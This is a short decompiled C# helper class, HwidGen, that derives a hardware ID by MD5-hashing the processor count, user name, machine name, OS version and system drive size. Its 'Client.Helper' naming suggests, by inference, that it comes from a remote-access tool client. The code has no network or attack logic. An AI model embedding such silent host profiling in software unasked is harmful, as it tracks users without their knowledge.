using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Client.Helper
{
	// Token: 0x02000007 RID: 7
	public static class HwidGen
	{
		// Token: 0x0600002D RID: 45 RVA: 0x000031D4 File Offset: 0x000013D4
		public static string HWID()
		{
			string result;
			try
			{
				result = HwidGen.GetHash(string.Concat(new object[]
				{
					Environment.ProcessorCount,
					Environment.UserName,
					Environment.MachineName,
					Environment.OSVersion,
					new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize
				}));
			}
			catch
			{
				result = "Err HWID";
			}
			return result;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00003258 File Offset: 0x00001458
		public static string GetHash(string strToHash)
		{
			HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider();
			byte[] array = Encoding.ASCII.GetBytes(strToHash);
			array = hashAlgorithm.ComputeHash(array);
			StringBuilder stringBuilder = new StringBuilder();
			foreach (byte b in array)
			{
				stringBuilder.Append(b.ToString("x2"));
			}
			return stringBuilder.ToString().Substring(0, 20).ToUpper();
		}
	}
}
